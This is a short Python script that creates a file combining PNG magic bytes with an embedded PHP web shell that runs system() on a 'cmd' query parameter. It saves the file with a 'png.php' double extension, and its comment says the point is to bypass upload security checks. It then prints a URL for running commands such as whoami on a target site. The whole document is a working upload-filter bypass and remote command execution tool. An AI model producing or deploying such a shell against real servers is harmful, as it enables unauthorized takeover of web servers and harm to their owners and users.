from io import BytesIO

# PHP content (example: simple system execution shell)
php_content = '''
<?php 
system($_GET["cmd"]);
?>
'''

# PNG file magic number (header signature)
png_magic_number = b'\x89PNG\r\n\x1a\n'

# Function to create a .png file with embedded PHP code and a PNG magic number
def create_php_to_png_with_magic_number():
    # Create an in-memory byte buffer
    f = BytesIO()
    
    # Write the PNG file magic number
    f.write(png_magic_number)
    
    # Write the PHP content into the buffer
    f.write(php_content.encode('utf-8'))  # Convert PHP content to bytes
    
    # Reset buffer position to the start
    f.seek(0)
    
    return f

# Generate the in-memory PHP-PNG hybrid file
php_png_file = create_php_to_png_with_magic_number()

# Save the file with a dual extension to bypass security checks
with open('phpinfo2.png.php', 'wb') as output_file:
    output_file.write(php_png_file.read())

# Print success message
print("File 'phpinfo2.png.php' successfully created with embedded PHP code and PNG magic number!")
print("Try exploiting by accessing: http://example.com/uploads/phpinfo2.png.php?cmd=whoami")
